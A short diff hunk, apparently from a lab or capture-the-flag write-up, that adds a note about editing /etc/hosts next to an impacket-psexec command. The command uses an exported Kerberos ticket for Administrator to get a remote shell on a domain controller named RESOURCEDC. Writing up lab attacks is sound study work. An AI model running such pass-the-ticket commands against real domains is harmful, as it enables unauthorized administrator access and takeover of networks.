@@ -54,6 +54,7 @@ export KRB5CCNAME='Administrator@cifs_RESOURCEDC.RESOURCED.LOCAL@RESOURCED.LOCAL
 
 Then:
 
+Note : Add on /etc/hosts
 ```
 impacket-psexec -k -no-pass resourced.local/Administrator@RESOURCEDC.RESOURCED.LOCAL
 ```
